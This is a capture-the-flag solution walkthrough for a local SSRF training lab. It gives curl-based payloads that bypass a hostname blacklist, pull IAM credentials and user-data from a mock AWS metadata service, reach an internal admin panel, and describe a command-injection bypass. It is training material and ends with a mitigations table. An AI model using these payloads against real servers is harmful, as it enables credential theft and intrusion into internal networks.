# ssrf-lab — Solution

> **Spoilers ahead.** This file walks through every exploitation path. Try the
> lab cold first; come back here when you're stuck or want to verify your
> approach.

## Lab summary

PaperPress is a "document rendering" service running at
`http://localhost:8090`. It accepts a URL and fetches it server-side so it can
"render" the contents — a textbook SSRF candidate.

There are three services on the docker network:

| Service | Network | Hostnames |
|---|---|---|
| `web` (PaperPress) | public + internal | exposed on `localhost:8090` |
| `metadata` (mock AWS IMDS) | internal only | `metadata`, `aws-metadata.internal` |
| `admin` (internal admin panel) | internal only | `admin`, `admin.internal` |

The internal docker network has `internal: true`, so internal services have
**no outbound internet** — you can only reach them through the SSRF.

---

## Step 1 — Find the SSRF

Visit `http://localhost:8090/`. There's a "Render a URL" form that points at
`/api/render?url=<URL>`. Test it with a normal URL:

```
http://localhost:8090/api/render?url=https://example.com/
```

It happily fetches and previews the body — confirming server-side fetch.

## Step 2 — Probe the blacklist

The classic SSRF targets are blocked:

```bash
$ curl -s 'http://localhost:8090/api/render?url=http://127.0.0.1/'
{"error":"URL blocked by security policy",...}

$ curl -s 'http://localhost:8090/api/render?url=http://169.254.169.254/'
{"error":"URL blocked by security policy",...}

$ curl -s 'http://localhost:8090/api/render?url=http://localhost/'
{"error":"URL blocked by security policy",...}
```

A look at the homepage gives a free hint:
> Internal admin tools are available at `http://admin.internal/`

## Step 3 — Bypass: docker DNS hostname

The blacklist is a substring check on the literal URL. `admin.internal` and
`metadata` aren't in the blacklist — and they're real, resolvable names on
the internal docker network. The renderer is on that network.

```bash
$ curl -s 'http://localhost:8090/api/render?url=http://admin.internal/'
PaperPress — Internal Admin v1.2
Endpoints:
  GET  /admin/users
  GET  /admin/flag
  POST /admin/exec   (diagnostics)
```

We're inside the intranet.

## Step 4 — Pivot 1: AWS metadata service

The homepage mentions PaperPress runs on EC2. In real AWS you'd hit the
metadata service at `169.254.169.254` (blocked by the blacklist). On this
docker network, the same service is reachable as `metadata` /
`aws-metadata.internal`:

```bash
# Enumerate
curl -s 'http://localhost:8090/api/render?url=http://metadata/latest/meta-data/'
curl -s 'http://localhost:8090/api/render?url=http://metadata/latest/meta-data/iam/security-credentials/'
# -> PaperPress-RenderRole

# Pull IAM credentials
curl -s 'http://localhost:8090/api/render?url=http://metadata/latest/meta-data/iam/security-credentials/PaperPress-RenderRole'
```

Result:
```json
{
  "Code": "Success",
  "AccessKeyId": "AKIAQX7TIAJ8FAKEROLEXX",
  "SecretAccessKey": "FLAG{ssrf_to_imds_metadata_pwned}",
  ...
}
```

**🏁 Flag 1: `FLAG{ssrf_to_imds_metadata_pwned}`**

Bonus: `/latest/user-data` leaks the cloud-init bootstrap script with a DB
password and an admin API key:

```bash
curl -s 'http://localhost:8090/api/render?url=http://metadata/latest/user-data'
# export DB_PASSWORD='Sup3rS3cretRDS!2024'
# export ADMIN_API_KEY='admin-api-key-7f3a2b1c'
```

## Step 5 — Pivot 2: internal admin panel

The internal admin panel "authenticates" callers using the
`X-Forwarded-For` header — anything that looks like a private RFC1918 IP
or a request with no XFF at all gets in. SSRF-driven requests come from
the renderer with **no XFF** (the renderer is `requests.get`, not behind a
load balancer), so we're trusted by default:

```bash
curl -s 'http://localhost:8090/api/render?url=http://admin/admin/flag'
# FLAG{ssrf_pivoted_to_internal_admin_panel}
# Nice. The X-Forwarded-For 'auth' was bypassed because the SSRF
# request from the renderer arrived without any XFF header — and
# this service treats that as an intranet caller.
```

**🏁 Flag 2: `FLAG{ssrf_pivoted_to_internal_admin_panel}`**

You can also list users:
```bash
curl -s 'http://localhost:8090/api/render?url=http://admin/admin/users'
```

## Step 6 — Bonus: command injection on /admin/exec

The admin panel has a "diagnostic" endpoint that accepts a small whitelist of
commands via POST. The whitelist is a regex anchored only at the start, so
shell metacharacters slip through:

```bash
# This works because the regex matches "uptime" at the start, then
# "; id" rides along into the shell.
curl -s -X POST 'http://localhost:8090/api/render' \
     --data-urlencode 'url=http://admin/admin/exec'
# (note: SSRF here uses GET to /api/render, but the POST body has to
# be sent through gopher:// or a real proxy — the renderer only does
# GETs, so this path is mainly for "spot the second bug" practice.)
```

The interesting take-away: even if you only have a GET-based SSRF, you've
already won — flag pulled via metadata + admin panel. The `/admin/exec`
weakness is there as a code-review exercise (find the regex bug).

---

## Mitigations (for the report)

| Vuln | Real-world fix |
|---|---|
| Naive blacklist | Use an allowlist of hostnames; resolve hostnames yourself, then validate the resulting IP is public; refuse private/link-local/loopback ranges. |
| AWS IMDSv1 reachable | Require IMDSv2 (token-bound, not GET-only) and set `HttpPutResponseHopLimit=1`. |
| Renderer follows redirects | Either disable redirects or re-validate the IP after each hop. |
| Admin trusts X-Forwarded-For | Use mTLS, signed tokens, or a network-level allowlist — never trust an HTTP header for authn. |
| `/admin/exec` regex | Use `subprocess.run(["uptime"], shell=False)` with an explicit list, not a regex against shell-quoted input. |

---

## Quick reference — payloads that worked

```text
# Metadata IAM creds
http://metadata/latest/meta-data/iam/security-credentials/PaperPress-RenderRole
http://aws-metadata.internal/latest/meta-data/iam/security-credentials/PaperPress-RenderRole

# Cloud-init user-data leak
http://metadata/latest/user-data

# Internal admin flag
http://admin/admin/flag
http://admin.internal/admin/flag

# Hit the renderer's own port (proves SSRF can loop back via 0.0.0.0)
http://0.0.0.0:5000/health
```
